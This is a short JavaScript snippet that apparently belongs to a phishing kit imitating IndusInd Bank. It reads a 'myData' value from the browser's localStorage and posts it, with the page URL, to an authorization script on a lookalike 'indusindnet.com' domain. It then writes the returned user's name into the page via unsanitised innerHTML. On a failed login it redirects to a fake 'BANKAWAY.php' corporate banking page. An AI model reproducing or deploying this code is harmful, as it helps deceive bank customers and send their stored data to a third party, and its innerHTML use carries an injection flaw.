var myData = localStorage.getItem('myData');

let user = "";

$.ajax({
         url: "https://indusind.indusindnet.com/server/clients/authorization/index.php",
         method: "POST",
         data: {
                  myData,
                  from: window.location.href
         },
         success(respone) {


                  const data = JSON.parse('[' + respone.trim().replace(/}{/g, '},{') + ']');

                  let user_name_span = $('.user_name_span');
                  user_name_span[0].innerHTML = data[0].fullname

                  console.log(user_name_span[0])

                  value(data)

                  if (respone == "LOGIN_INVALID") {
                           window.open("https://indusindbank.indusindnet.com/corp/BANKAWAY.php", "_self")
                  }

         },
         error(error) {
                  console.log(error);
         }
})